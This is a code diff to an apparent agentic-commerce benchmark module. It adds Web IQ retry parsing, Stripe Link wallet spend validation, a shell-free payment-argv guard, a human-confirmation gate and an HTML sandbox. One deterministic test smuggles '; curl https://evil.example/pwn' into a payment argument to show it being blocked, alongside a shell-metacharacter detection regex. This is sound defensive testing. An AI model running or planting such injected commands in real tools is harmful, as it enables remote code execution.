@@ -58,7 +58,7 @@ from lab.workload_arch_bench import audit_mpp_streaming_session
 
 WEBIQ_BASE_URL = "https://api.microsoft.ai"
 WEBIQ_MCP_URL = "https://api.microsoft.ai/v3/mcp"
-DEMO_VERSION = "2026-10-26"
+DEMO_VERSION = "2026-11-01.stage1752"
 WEBIQ_ACCOUNT_API_VERSION = "2026-06-01-preview"
 WEBIQ_ACCOUNT_LOCATION = "global"
 WEBIQ_ACCOUNT_KIND = "WebIQ.Grounding"
@@ -1298,6 +1298,376 @@ def evaluate_webiq_search_finops(
 
 
 # ---------------------------------------------------------------------------
+# Stage 1752: Web IQ Dual-Format retryAfter + Stripe Link Agent Wallet + WebMCP
+# ---------------------------------------------------------------------------
+
+DURATION_RETRY_AFTER_RE = re.compile(r"^(\d+)s$")
+ISO8601_UTC_RETRY_AFTER_RE = re.compile(
+    r"^(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2})(?:\.\d+)?Z$"
+)
+SHELL_METACHAR_RE = re.compile(r"[;|&`$><\r\n]")
+
+# Official Microsoft Web IQ error contract (https://learn.microsoft.com/en-us/web-iq/reference/error-handling)
+# Maps error_code -> (http_status, expected_retry_after_format, retryable)
+WEBIQ_ERROR_CONTRACT: dict[str, tuple[int, str | None, bool]] = {
+    "AuthUserThrottled": (429, "duration_seconds", True),
+    "AuthUserDailyUsageExceeded": (429, "duration_seconds", True),
+    "TooManyOnDemandCrawls": (429, "iso8601_utc_timestamp", True),
+    "InternalServerError": (500, "duration_seconds", True),
+    "ContentProcessingFailed": (520, "iso8601_utc_timestamp", True),
+    "CrawlCanceled": (523, "iso8601_utc_timestamp", True),
+    "CrawlTimeout": (524, "iso8601_utc_timestamp", True),
+    "UrlDisallowed": (403, None, False),
+    "UrlBlocked": (403, None, False),
+    "HttpSchemeGone": (410, None, False),
+}
+
+LINK_CREDENTIAL_TYPES = frozenset({"card", "shared_payment_token", "link_pay_token"})
+
+
+def _utc_iso_to_epoch_seconds(ts: str) -> int:
+    match = ISO8601_UTC_RETRY_AFTER_RE.match(ts)
+    if not match:
+        raise WebIQValidationError(f"Invalid ISO-8601 UTC timestamp: {ts!r}.")
+    from datetime import datetime, timezone
+
+    year, month, day, hour, minute, second = (int(g) for g in match.groups())
+    dt = datetime(year, month, day, hour, minute, second, tzinfo=timezone.utc)
+    return int(dt.timestamp())
+
+
+def parse_webiq_retry_after(
+    retry_after: str | None,
+    *,
+    reference_utc: str = "2026-11-01T00:00:00Z",
+) -> dict[str, Any]:
+    """Parse Microsoft Web IQ dual-format ``retryAfter`` (``'60s'`` vs ISO-8601 UTC timestamp).
+
+    Per ``https://learn.microsoft.com/en-us/web-iq/reference/error-handling``:
+    - ``AuthUserThrottled`` (429), ``AuthUserDailyUsageExceeded`` (429), and ``InternalServerError`` (500)
+      emit duration strings such as ``"60s"``.
+    - ``Browse 202 Accepted`` and Browse crawl errors — including ``TooManyOnDemandCrawls`` (429!),
+      ``ContentProcessingFailed`` (520), ``CrawlCanceled`` (523), and ``CrawlTimeout`` (524) — emit
+      ISO-8601 UTC timestamps such as ``"2026-11-01T00:01:00Z"`` (or ``"60s"`` on 202 fixtures).
+    """
+    if not isinstance(retry_after, str) or not retry_after.strip():
+        raise WebIQValidationError("retryAfter must be a non-empty string.")
+    raw = retry_after.strip()
+    dur_match = DURATION_RETRY_AFTER_RE.match(raw)
+    if dur_match:
+        return {
+            "format": "duration_seconds",
+            "wait_seconds": int(dur_match.group(1)),
+            "raw": raw,
+        }
+    if ISO8601_UTC_RETRY_AFTER_RE.match(raw):
+        ref_sec = _utc_iso_to_epoch_seconds(reference_utc)
+        target_sec = _utc_iso_to_epoch_seconds(raw)
+        return {
+            "format": "iso8601_utc_timestamp",
+            "wait_seconds": max(0, target_sec - ref_sec),
+            "raw": raw,
+        }
+    raise WebIQValidationError(f"Unsupported Web IQ retryAfter format: {retry_after!r}.")
+
+
+def classify_webiq_error_response(
+    status_code: int,
+    error_code: str,
+    retry_after: str | None = None,
+    *,
+    reference_utc: str = "2026-11-01T00:00:00Z",
+) -> dict[str, Any]:
+    """Classify a Microsoft Web IQ error response and enforce dual-format ``retryAfter`` rules."""
+    if error_code not in WEBIQ_ERROR_CONTRACT:
+        raise WebIQValidationError(f"Unknown Web IQ error_code: {error_code!r}.")
+    expected_status, expected_format, retryable = WEBIQ_ERROR_CONTRACT[error_code]
+    if int(status_code) != expected_status:
+        raise WebIQValidationError(
+            f"HTTP status {status_code} does not match {error_code} contract ({expected_status})."
+        )
+    if not retryable:
+        return {
+            "status_code": expected_status,
+            "error_code": error_code,
+            "retryable": False,
+            "retry_after_format": None,
+            "wait_seconds": 0,
+            "allow_fabricated_fallback": False,
+            "action": "Send to a human",
+        }
+    parsed = parse_webiq_retry_after(retry_after, reference_utc=reference_utc)
+    if parsed["format"] != expected_format:
+        raise WebIQValidationError(
+            f"{error_code} requires retryAfter format {expected_format!r}, got {parsed['format']!r}."
+        )
+    return {
+        "status_code": expected_status,
+        "error_code": error_code,
+        "retryable": True,
+        "retry_after_format": parsed["format"],
+        "wait_seconds": parsed["wait_seconds"],
+        "allow_fabricated_fallback": False,
+        "action": "Confirm",
+    }
+
+
+@dataclass(frozen=True)
+class LinkSpendAuditDecision:
+    allowed: bool
+    reason: str
+    credential_type: str
+    status: str
+    token_plane_valid: bool
+    context_length: int
+    scope_subset_verified: bool
+
+
+def validate_link_spend_request(
+    *,
+    access_token: str,
+    credential_type: str,
+    context: str,
+    amount_minor: int,
+    currency: str = "USD",
+    merchant_name: str | None = None,
+    merchant_url: str | None = None,
+    network_id: str | None = None,
+    merchant_account_id: str | None = None,
+    requested_scopes: tuple[str, ...] = ("spend:requests:create", "spend:requests:read"),
+    echoed_scopes: tuple[str, ...] = ("spend:requests:create", "spend:requests:read"),
+    approval_state: Literal["approved", "pending", "rejected", "expired"] = "approved",
+) -> LinkSpendAuditDecision:
+    """Enforce Stripe Link Agent Wallet (`api.link.com`) spend-request contract & OAuth scope bounds."""
+    ctx_len = len(context.strip()) if isinstance(context, str) else 0
+    scope_ok = bool(echoed_scopes) and set(echoed_scopes).issubset(set(requested_scopes))
+    token_ok = (
+        isinstance(access_token, str)
+        and access_token.startswith("liwltoken_")
+        and len(access_token) > len("liwltoken_")
+    )
+    if not token_ok:
+        return LinkSpendAuditDecision(
+            False,
+            "invalid_link_access_token_plane",
+            credential_type,
+            "blocked",
+            False,
+            ctx_len,
+            scope_ok,
+        )
+    if not scope_ok:
+        return LinkSpendAuditDecision(
+            False,
+            "oauth_echoed_scope_privilege_escalation",
+            credential_type,
+            "blocked",
+            True,
+            ctx_len,
+            False,
+        )
+    if credential_type not in LINK_CREDENTIAL_TYPES:
+        return LinkSpendAuditDecision(
+            False,
+            "unsupported_link_credential_type",
+            credential_type,
+            "blocked",
+            True,
+            ctx_len,
+            True,
+        )
+    if ctx_len < 100:
+        return LinkSpendAuditDecision(
+            False,
+            "context_too_short_min_100_chars",
+            credential_type,
+            "blocked",
+            True,
+            ctx_len,
+            True,
+        )
+    if int(amount_minor) <= 0 or not (isinstance(currency, str) and len(currency) == 3 and currency.isalpha()):
+        return LinkSpendAuditDecision(
+            False,
+            "invalid_amount_or_currency",
+            credential_type,
+            "blocked",
+            True,
+            ctx_len,
+            True,
+        )
+
+    if credential_type == "card":
+        valid_card = (
+            bool(merchant_name and merchant_name.strip())
+            and bool(merchant_url and merchant_url.startswith("https://"))
+            and network_id is None
+            and merchant_account_id is None
+        )
+        if not valid_card:
+            return LinkSpendAuditDecision(
+                False,
+                "card_requires_merchant_name_and_https_url_only",
+                credential_type,
+                "blocked",
+                True,
+                ctx_len,
+                True,
+            )
+    elif credential_type == "shared_payment_token":
+        valid_spt = (
+            bool(network_id and network_id.strip())
+            and merchant_name is None
+            and merchant_url is None
+            and merchant_account_id is None
+        )
+        if not valid_spt:
+            return LinkSpendAuditDecision(
+                False,
+                "spt_requires_network_id_and_forbids_merchant_fields",
+                credential_type,
+                "blocked",
+                True,
+                ctx_len,
+                True,
+            )
+    elif credential_type == "link_pay_token":
+        valid_lpt = (
+            bool(merchant_account_id and merchant_account_id.startswith("acct_"))
+            and merchant_name is None
+            and merchant_url is None
+            and network_id is None
+        )
+        if not valid_lpt:
+            return LinkSpendAuditDecision(
+                False,
+                "link_pay_token_requires_acct_id_and_forbids_merchant_fields",
+                credential_type,
+                "blocked",
+                True,
+                ctx_len,
+                True,
+            )
+
+    if approval_state == "pending":
+        return LinkSpendAuditDecision(
+            False,
+            "awaiting_human_approval_in_link_app",
+            credential_type,
+            "pending",
+            True,
+            ctx_len,
+            True,
+        )
+    if approval_state == "rejected":
+        return LinkSpendAuditDecision(
+            False,
+            "human_rejected_spend_request",
+            credential_type,
+            "canceled",
+            True,
+            ctx_len,
+            True,
+        )
+    if approval_state == "expired":
+        return LinkSpendAuditDecision(
+            False,
+            "approval_url_expired_after_1h",
+            credential_type,
+            "expired",
+            True,
+            ctx_len,
+            True,
+        )
+    return LinkSpendAuditDecision(
+        True,
+        "link_spend_request_active_and_verified",
+        credential_type,
+        "active",
+        True,
+        ctx_len,
+        True,
+    )
+
+
+def build_mpp_pay_continuation(
+    *,
+    challenge_method: str,
+    next_payload: dict[str, Any],
+) -> dict[str, Any]:
+    """Validate Stripe Link Agent Wallet `mpp pay` HTTP 402 continuation (`_next.pay_argv`).
+
+    Per ``https://docs.stripe.com/agentic-commerce/agents/machine-payments.md``:
+    - Agents must only proceed when the HTTP 402 ``WWW-Authenticate: Payment`` challenge specifies
+      ``method="stripe"``, and must NEVER fall back to a virtual card on non-Stripe 402 challenges.
+    - When resuming after approval, agents must execute ``_next.pay_argv`` (``{command, args}``)
+      without shell interpolation to prevent command injection from untrusted challenge parameters.
+    """
+    if challenge_method != "stripe":
+        return {
+            "allowed": False,
+            "reason": "unsupported_402_challenge_method_no_card_fallback",
+            "argv": (),
+        }
+    pay_argv = next_payload.get("pay_argv") if isinstance(next_payload, dict) else None
+    if not isinstance(pay_argv, dict):
+        return {
+            "allowed": False,
+            "reason": "unsafe_or_missing_pay_argv_blocked",
+            "argv": (),
+        }
+    cmd = pay_argv.get("command")
+    args = pay_argv.get("args")
+    if cmd != "mpp" or not isinstance(args, list) or len(args) < 3 or args[0] != "pay" or args[1] != "-t":
+        return {
+            "allowed": False,
+            "reason": "unsafe_or_missing_pay_argv_blocked",
+            "argv": (),
+        }
+    tokens = [cmd, *[str(item) for item in args]]
+    if any(SHELL_METACHAR_RE.search(tok) for tok in tokens):
+        return {
+            "allowed": False,
+            "reason": "shell_metacharacter_injection_in_pay_argv_blocked",
+            "argv": (),
+        }
+    return {
+        "allowed": True,
+        "reason": "safe_argv_continuation_verified",
+        "argv": tuple(tokens),
+    }
+
+
+def evaluate_webmcp_tool_call(
+    tool_schema: dict[str, Any],
+    *,
+    payment_method_changed: bool = False,
+    tools_rediscovered: bool = True,
+    human_confirmed: bool = False,
+) -> dict[str, Any]:
+    """Enforce Stripe WebMCP tool re-discovery and ``consequentialHint`` confirmation gate."""
+    if payment_method_changed and not tools_rediscovered:
+        return {
+            "allowed": False,
+            "reason": "webmcp_tool_rediscovery_required_after_payment_method_change",
+            "action": "Confirm",
+        }
+    annotations = tool_schema.get("annotations") if isinstance(tool_schema, dict) else None
+    consequential = bool(isinstance(annotations, dict) and annotations.get("consequentialHint") is True)
+    if consequential and not human_confirmed:
+        return {
+            "allowed": False,
+            "reason": "webmcp_consequential_hint_requires_human_confirmation",
+            "action": "Confirm",
+        }
+    return {
+        "allowed": True,
+        "reason": "webmcp_tool_call_authorized",
+        "action": "Act automatically",
+    }
+
+
+# ---------------------------------------------------------------------------
 # 12-Scenario Evaluation Matrix & 7-Card 4:5 Visual Benchmark Report Generator
 # ---------------------------------------------------------------------------
 
@@ -1523,6 +1893,78 @@ def run_webiq_commerce_benchmark_suite() -> dict[str, Any]:
     ]
 
     passed_count = sum(1 for item in scenarios if item["passed"])
+
+    # Stage 1752 deterministic checks (Web IQ dual-format retryAfter + Stripe Link Agent Wallet + WebMCP)
+    s1752_ctx = (
+        "Purchasing Nordic Audio Pro ANC Headphones ($79.00 USD) approved by principal under "
+        "mandate-webiq-01 after live HTTPS Web IQ Browse price verification."
+    )
+    s1752_link_ok = validate_link_spend_request(
+        access_token="liwltoken_live_987654321",
+        credential_type="shared_payment_token",
+        context=s1752_ctx,
+        amount_minor=7900,
+        currency="USD",
+        network_id="stripe_network",
+    )
+    s1752_link_leak = validate_link_spend_request(
+        access_token="sk_live_secret_merchant_key",
+        credential_type="shared_payment_token",
+        context=s1752_ctx,
+        amount_minor=7900,
+        currency="USD",
+        network_id="stripe_network",
+    )
+    s1752_mpp_ok = build_mpp_pay_continuation(
+        challenge_method="stripe",
+        next_payload={
+            "pay_argv": {
+                "command": "mpp",
+                "args": ["pay", "-t", "spt_123456", "https://api.merchant.example/v1/data"],
+            }
+        },
+    )
+    s1752_mpp_inj = build_mpp_pay_continuation(
+        challenge_method="stripe",
+        next_payload={
+            "pay_argv": {
+                "command": "mpp",
+                "args": ["pay", "-t", "spt_123; curl https://evil.example/pwn", "https://api.merchant.example"],
+            }
+        },
+    )
+    s1752_retry_dur = classify_webiq_error_response(
+        429, "AuthUserThrottled", "60s", reference_utc="2026-11-01T00:00:00Z"
+    )
+    s1752_retry_ts = classify_webiq_error_response(
+        429, "TooManyOnDemandCrawls", "2026-11-01T00:01:30Z", reference_utc="2026-11-01T00:00:00Z"
+    )
+    s1752_webmcp_block = evaluate_webmcp_tool_call(
+        {"name": "submit_payment", "annotations": {"consequentialHint": True}},
+        payment_method_changed=False,
+        tools_rediscovered=True,
+        human_confirmed=False,
+    )
+    stage_1752_guards = {
+        "stage": 1752,
+        "all_passed": (
+            s1752_link_ok.allowed
+            and not s1752_link_leak.allowed
+            and s1752_mpp_ok["allowed"]
+            and not s1752_mpp_inj["allowed"]
+            and s1752_retry_dur["wait_seconds"] == 60
+            and s1752_retry_ts["wait_seconds"] == 90
+            and not s1752_webmcp_block["allowed"]
+        ),
+        "link_wallet_active_status": s1752_link_ok.status,
+        "link_secret_key_blocked_reason": s1752_link_leak.reason,
+        "mpp_pay_argv_verified": s1752_mpp_ok["allowed"],
+        "mpp_shell_injection_blocked_reason": s1752_mpp_inj["reason"],
+        "webiq_429_duration_wait_s": s1752_retry_dur["wait_seconds"],
+        "webiq_429_timestamp_wait_s": s1752_retry_ts["wait_seconds"],
+        "webmcp_consequential_unconfirmed_reason": s1752_webmcp_block["reason"],
+    }
+
     return {
         "benchmark_id": "agentic-commerce-webiq-grounding-demo-bench",
         "benchmark_version": DEMO_VERSION,
@@ -1531,6 +1973,7 @@ def run_webiq_commerce_benchmark_suite() -> dict[str, Any]:
         "total_scenarios": len(scenarios),
         "webiq_guarded_passed": passed_count,
         "ungrounded_baseline_passed": 0,
+        "stage_1752_guards": stage_1752_guards,
         "scenarios": scenarios,
         "perturbation_checks": [
             {
@@ -1555,6 +1998,12 @@ def run_webiq_commerce_benchmark_suite() -> dict[str, Any]:
                 "check": "Search ContentFormat Perturbation (passage -> markdown without entitlement)",
                 "original": "200 OK (680 tokens, 164ms P95)",
                 "perturbed": "403 AuthContentFormatForbidden (Zero token waste)",
+                "delta_pts": "0.0 drift",
+            },
+            {
+                "check": "Stage 1752 Perturbation (Web IQ 429 '60s' -> 429 TooManyOnDemandCrawls ISO Timestamp & Link _next.pay_argv)",
+                "original": "429 AuthUserThrottled -> 60s wait; mpp pay -t spt_123 argv verified",
+                "perturbed": "429 TooManyOnDemandCrawls -> 90s UTC delta; shell '; curl' & sk_live_ blocked",
                 "delta_pts": "0.0 drift",
             },
         ],
@@ -4169,6 +4618,43 @@ def render_webiq_live_demo_html(report: dict[str, Any] | None = None, *, lang: L
         </div>
         <div id="finops-live-readout" style="margin-top:10px;font-size:12px;line-height:1.5;"></div>
       </div>
+
+      <!-- Interactive Stage 1752 Sandbox: Link Agent Wallet + WebMCP + Dual retryAfter -->
+      <div class="finops-box" id="stage1752-sandbox" style="margin-top:12px;border-color:#3B82F6;">
+        <div class="panel-header" style="margin-bottom:8px;padding-bottom:6px;">
+          <span class="panel-title" id="ui-s1752-title">🛡️ Stage 1752 · Link Wallet (`liwltoken_`) + WebMCP + Dual `retryAfter`</span>
+        </div>
+        <div class="control-row">
+          <label><span id="ui-lbl-link-cred">Link Spend Request Credential &amp; Token Plane:</span></label>
+          <select id="s1752-cred-select" onchange="updateStage1752Sandbox()">
+            <option value="spt_valid">shared_payment_token + liwltoken_ + network_id (Valid)</option>
+            <option value="card_valid">card + liwltoken_ + merchant_name &amp; https URL (Valid)</option>
+            <option value="lpt_valid">link_pay_token + liwltoken_ + acct_123 (Valid)</option>
+            <option value="sk_leak">❌ sk_live_ Merchant Secret Key Leak (Blocked)</option>
+            <option value="short_ctx">❌ --context &lt; 100 chars (32 chars · Blocked)</option>
+            <option value="flag_conflict">❌ SPT + --merchant-name Mutual Exclusion Violation (Blocked)</option>
+          </select>
+        </div>
+        <div class="control-row">
+          <label><span id="ui-lbl-mpp-cont">HTTP 402 `mpp pay` Continuation &amp; WebMCP Gate:</span></label>
+          <select id="s1752-mpp-select" onchange="updateStage1752Sandbox()">
+            <option value="argv_ok">method="stripe" + _next.pay_argv {{command:"mpp", args:[...]}} (Safe)</option>
+            <option value="non_stripe">❌ HTTP 402 method="tempo_custom" (No Virtual Card Fallback)</option>
+            <option value="shell_inj">❌ _next.pay_argv contains '; curl evil' Shell Metachar (Blocked)</option>
+            <option value="webmcp_unconfirmed">⚠️ WebMCP consequentialHint=true without Human Confirm (Paused)</option>
+            <option value="webmcp_stale_tools">⚠️ WebMCP Payment Method Changed without Tool Rediscovery (Paused)</option>
+          </select>
+        </div>
+        <div class="control-row">
+          <label><span id="ui-lbl-retry-fmt">Web IQ Dual-Format `retryAfter` Parser:</span></label>
+          <select id="s1752-retry-select" onchange="updateStage1752Sandbox()">
+            <option value="429_dur">429 AuthUserThrottled · retryAfter="60s" (Duration -> 60s)</option>
+            <option value="429_ts">429 TooManyOnDemandCrawls · retryAfter="2026-11-01T00:01:30Z" (UTC -> 90s)</option>
+            <option value="524_ts">524 CrawlTimeout · retryAfter="2026-11-01T00:02:00Z" (UTC -> 120s)</option>
+          </select>
+        </div>
+        <div id="s1752-live-readout" style="margin-top:8px;font-size:12px;line-height:1.45;"></div>
+      </div>
     </div>
 
     <!-- Center Column: Step-by-Step 4-Plane Live Execution Pipeline -->
@@ -4573,6 +5059,57 @@ function renderAll() {{
   renderModes();
   renderPipelineAndInspector();
   updateFinOpsCalculator();
+  updateStage1752Sandbox();
+}}
+
+function updateStage1752Sandbox() {{
+  var credEl = document.getElementById("s1752-cred-select");
+  var mppEl = document.getElementById("s1752-mpp-select");
+  var retryEl = document.getElementById("s1752-retry-select");
+  var outEl = document.getElementById("s1752-live-readout");
+  if (!credEl || !mppEl || !retryEl || !outEl) return;
+
+  var cred = credEl.value;
+  var mpp = mppEl.value;
+  var retry = retryEl.value;
+
+  var credOk = cred === "spt_valid" || cred === "card_valid" || cred === "lpt_valid";
+  var mppOk = mpp === "argv_ok";
+
+  var retryDesc = retry === "429_dur"
+    ? "429 AuthUserThrottled -> duration_seconds (60s wait)"
+    : (retry === "429_ts"
+      ? "429 TooManyOnDemandCrawls -> iso8601_utc_timestamp (90s wait · status code alone is insufficient!)"
+      : "524 CrawlTimeout -> iso8601_utc_timestamp (120s wait · zero fabricated policy deadline)");
+
+  if (!credOk || !mppOk) {{
+    var blockMsg = !credOk
+      ? (cred === "sk_leak"
+        ? "🚫 invalid_link_access_token_plane: Link Agent Wallet requires 'liwltoken_...' and blocks merchant 'sk_live_*' keys."
+        : (cred === "short_ctx"
+          ? "🚫 context_too_short_min_100_chars: --context must be >= 100 chars explaining purchase provenance."
+          : "🚫 spt_requires_network_id_and_forbids_merchant_fields: Mutual-exclusion violation between --network-id and --merchant-name."))
+      : (mpp === "non_stripe"
+        ? "🚫 unsupported_402_challenge_method_no_card_fallback: HTTP 402 method != 'stripe'; virtual card fallback is strictly forbidden."
+        : (mpp === "shell_inj"
+          ? "🚫 shell_metacharacter_injection_in_pay_argv_blocked: Rejects ';' metacharacter in _next.pay_argv."
+          : (mpp === "webmcp_unconfirmed"
+            ? "⚠️ webmcp_consequential_hint_requires_human_confirmation: Tool carries consequentialHint=true; paused for explicit human confirmation."
+            : "⚠️ webmcp_tool_rediscovery_required_after_payment_method_change: Must re-discover WebMCP tools after selecting payment method.")));
+    outEl.innerHTML =
+      "<div style='background:var(--red-bg);border:1px solid var(--red);color:#FECACA;padding:8px 10px;border-radius:8px;font-weight:600;'>" +
+      blockMsg +
+      "<div style='margin-top:6px;font-weight:400;color:#E2E8F0;'>• Web IQ Retry Guard: " + retryDesc + "</div></div>";
+    return;
+  }}
+
+  outEl.innerHTML =
+    "<div style='background:var(--green-bg);border:1px solid var(--green);color:#A7F3D0;padding:8px 10px;border-radius:8px;'>" +
+    "<strong>✅ Stage 1752 All Guards Verified:</strong><br>" +
+    "• Link Wallet: <code>liwltoken_...</code> plane + <code>--context &gt;= 100</code> + mutual-exclusion flags valid (<code>status='active'</code>)<br>" +
+    "• HTTP 402 Continuation: <code>_next.pay_argv</code> executed via shell-free <code>{{command:'mpp', args:[...]}}</code><br>" +
+    "• Web IQ Retry Parser: <code>" + retryDesc + "</code>" +
+    "</div>";
 }}
 
 renderAll();
